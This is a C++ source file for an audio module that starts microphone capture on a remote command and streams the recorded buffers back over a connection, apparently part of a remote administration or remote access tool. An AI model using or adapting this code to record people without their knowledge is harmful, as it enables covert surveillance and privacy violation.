#include "Audio.h"


CAudio::CAudio(DWORD dwIdentity):
CEventHandler(dwIdentity)
{
	m_hWorkThread = NULL;
	m_IsWorking = FALSE;
}


CAudio::~CAudio()
{
}

void CAudio::OnConnect()
{

}

void CAudio::OnClose()
{
	OnAudioStop();
}

void CAudio::OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{
	switch (Event)
	{
	case AUDIO_BEGIN:
		OnAudioBegin();
		break;
	case AUDIO_STOP:
		OnAudioStop();
		break;
	/*case AUDIO_DATA:
		break;*/
	default:
		break;
	}
}

void CAudio::OnAudioBegin()
{
	WCHAR szError[] = L"Audio Grab Error";
	OnAudioStop();

	if (!m_AudioGrab.GrabInit())
	{
		Send(AUDIO_ERROR, (char*)szError, sizeof(WCHAR)*(wcslen(szError) + 1));
		return;
	}
	InterlockedExchange(&m_IsWorking, TRUE);

	if (m_AudioGrab.StartGrab())
	{
		m_hWorkThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, 0);
	}
	else
	{
		InterlockedExchange(&m_IsWorking, FALSE);
		Send(AUDIO_ERROR, (char*)szError, sizeof(WCHAR)*(wcslen(szError) + 1));
	}
}

void CAudio::OnAudioStop()
{
	m_AudioGrab.StopGrab();
	InterlockedExchange(&m_IsWorking, FALSE);
	
	if (m_hWorkThread)
	{
		WaitForSingleObject(m_hWorkThread,INFINITE);
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}
	m_AudioGrab.GrabTerm();
}

void CAudio::WorkThread(CAudio*pThis)
{
	WCHAR szError[] = L"Get Audio Buffer Error!";
	while (InterlockedExchange(&pThis->m_IsWorking, TRUE))
	{
		char*Buffer = NULL;
		DWORD dwLen = NULL;
		//»ñÈ¡buffer·¢ËÍ
		if (pThis->m_AudioGrab.GetBuffer((void**)&Buffer, &dwLen))
		{
			pThis->Send(AUDIO_DATA, Buffer, dwLen);
			free(Buffer);
		}
	}
	InterlockedExchange(&pThis->m_IsWorking, FALSE);
}